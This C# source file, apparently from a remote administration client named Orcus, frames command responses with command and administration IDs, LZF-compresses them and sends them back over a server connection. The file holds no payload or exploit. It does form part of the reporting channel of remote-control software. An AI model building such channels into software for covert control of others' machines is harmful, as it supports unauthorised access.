using System;
using System.IO;
using Orcus.Connection;
using Orcus.Plugins;
using Orcus.Shared.Communication;
using Orcus.Shared.Compression;
using Orcus.Shared.Connection;
using Orcus.Shared.Data;

namespace Orcus.CommandManagement
{
    public class ConnectionInfo : IConnectionInfo
    {
        private readonly object _sendLock;
        private bool _isFailed;

        public ConnectionInfo(ServerConnection connection, ushort administrationId, IClientInfo clientInfo,
            IConnectionInitializer connectionInitializer)
        {
            ServerConnection = connection;
            AdministrationId = administrationId;
            _sendLock = connection.SendLock;
            ClientInfo = clientInfo;
            ConnectionInitializer = connectionInitializer;
        }

        public event EventHandler Failed;

        public ServerConnection ServerConnection { get; }
        public IClientInfo ClientInfo { get; }
        public IConnectionInitializer ConnectionInitializer { get; }
        public ushort AdministrationId { get; }

        public void CommandFailed(Command command, byte[] data)
        {
            var package = new byte[4 + 1 + data.Length];
            Array.Copy(BitConverter.GetBytes(command.Identifier), package, 4);
            package[4] = (byte) Shared.Communication.CommandResponse.Failed;
            Array.Copy(data, 0, package, 5, data.Length);
            Response(package, ResponseType.CommandResponse);
        }

        public void CommandSucceed(Command command, byte[] data)
        {
            var package = new byte[4 + 1 + data.Length];
            Array.Copy(BitConverter.GetBytes(command.Identifier), package, 4);
            package[4] = (byte) Shared.Communication.CommandResponse.Successful;
            Array.Copy(data, 0, package, 5, data.Length);
            Response(package, ResponseType.CommandResponse);
        }

        public void CommandWarning(Command command, byte[] data)
        {
            var package = new byte[4 + 1 + data.Length];
            Array.Copy(BitConverter.GetBytes(command.Identifier), package, 4);
            package[4] = (byte) Shared.Communication.CommandResponse.Warning;
            Array.Copy(data, 0, package, 5, data.Length);
            Response(package, ResponseType.CommandResponse);
        }

        public void CommandResponse(Command command, byte[] data,
            PackageCompression packageCompression = PackageCompression.Auto)
        {
            var package = new byte[4 + data.Length];
            Array.Copy(BitConverter.GetBytes(command.Identifier), package, 4);
            Array.Copy(data, 0, package, 4, data.Length);
            Response(package, ResponseType.CommandResponse, packageCompression);
        }

        public void UnsafeResponse(Command command, int length, Action<BinaryWriter> writeAction)
        {
            UnsafeResponse(command, new WriterCall(length, writeAction));
        }

        public void UnsafeResponse(Command command, WriterCall writerCall)
        {
            if (_isFailed)
                return;

            lock (_sendLock)
            {
                try
                {
                    ServerConnection.BinaryWriter.Write((byte) FromClientPackage.ResponseToAdministration);

                    ServerConnection.BinaryWriter.Write(writerCall.Size + 7);
                    //1 for the responseType and 2 for the ushort
                    ServerConnection.BinaryWriter.Write(BitConverter.GetBytes(AdministrationId));
                    ServerConnection.BinaryWriter.Write((byte) ResponseType.CommandResponse);
                    ServerConnection.BinaryWriter.Write(BitConverter.GetBytes(command.Identifier));
                    writerCall.WriteIntoStream(ServerConnection.BinaryWriter.BaseStream);
                    ServerConnection.BinaryWriter.Flush();
                }
                catch (Exception)
                {
                    OnFailed();
                }
            }
        }

        public void Response(byte[] package, ResponseType responseType,
            PackageCompression packageCompression = PackageCompression.Auto)
        {
            if (_isFailed)
                return;

            byte[] compressedData = null;
            var compressed = false;
            if ((package.Length > 75 && packageCompression == PackageCompression.Auto) ||
                packageCompression == PackageCompression.Compress)
                //Because there is a lot of overhead, we don't compress below 75 B
            {
                compressedData = LZF.Compress(package, 0);
                if (package.Length > compressedData.Length)
                    //If the compression isn't larger than the source, we will send the compressed data
                    compressed = true;
            }

            lock (_sendLock)
            {
                try
                {
                    ServerConnection.BinaryWriter.Write(
                        (byte)
                            (compressed
                                ? FromClientPackage.ResponseToAdministrationCompressed
                                : FromClientPackage.ResponseToAdministration));

                    ServerConnection.BinaryWriter.Write((compressed ? compressedData.Length : package.Length) + 3);
                    //1 for the responseType and 2 for the ushort
                    ServerConnection.BinaryWriter.Write(BitConverter.GetBytes(AdministrationId));
                    ServerConnection.BinaryWriter.Write((byte) responseType);
                    ServerConnection.BinaryWriter.Write(compressed ? compressedData : package);
                    ServerConnection.BinaryWriter.Flush();
                }
                catch (Exception)
                {
                    OnFailed();
                }
            }
        }

        public void SendServerPackage(ServerPackageType serverPackageType, byte[] data, bool redirectPackage)
        {
            ServerConnection.SendServerPackage(serverPackageType, data, redirectPackage, AdministrationId);
        }

        protected void OnFailed()
        {
            _isFailed = true;
            Failed?.Invoke(this, EventArgs.Empty);
        }
    }
}